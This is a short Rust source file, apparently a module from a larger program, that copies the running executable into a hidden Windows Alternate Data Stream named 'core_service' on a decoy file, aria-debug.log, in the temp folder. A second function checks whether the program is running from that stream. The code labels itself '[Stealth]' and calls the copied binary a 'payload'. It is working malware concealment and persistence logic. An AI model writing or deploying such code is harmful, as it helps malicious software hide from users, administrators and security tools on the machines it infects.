use std::env;
use std::fs;
use std::io::{self, Write};

use log::info;

/// Install current binary to Alternate Data Stream (ADS)
/// Target: %TEMP%\aria-debug.log:core_service
pub fn install_to_ads() -> io::Result<String> {
    let current_exe = env::current_exe()?;
    let temp_dir = env::temp_dir();
    let host_file = temp_dir.join("aria-debug.log");
    
    // Ensure host file exists (empty)
    if !host_file.exists() {
        fs::File::create(&host_file)?;
    }

    // ADS Path: host:stream
    // Rust std::fs handles basic paths, but specific ADS syntax might need raw string handling (?)
    // Actually std::fs works with "file:stream" on Windows.
    let ads_path = format!("{}:core_service", host_file.to_string_lossy());
    
    info!("[Stealth] Installing payload to ADS: {}", ads_path);
    
    // Read Self
    let payload = fs::read(&current_exe)?;
    
    // Write to ADS
    let mut ads_file = fs::File::create(&ads_path)?;
    ads_file.write_all(&payload)?;
    
    Ok(ads_path)
}

/// Check if running from ADS
pub fn is_running_from_ads() -> bool {
    if let Ok(path) = env::current_exe() {
        let path_str = path.to_string_lossy();
        return path_str.to_lowercase().contains(":core_service");
    }
    false
}
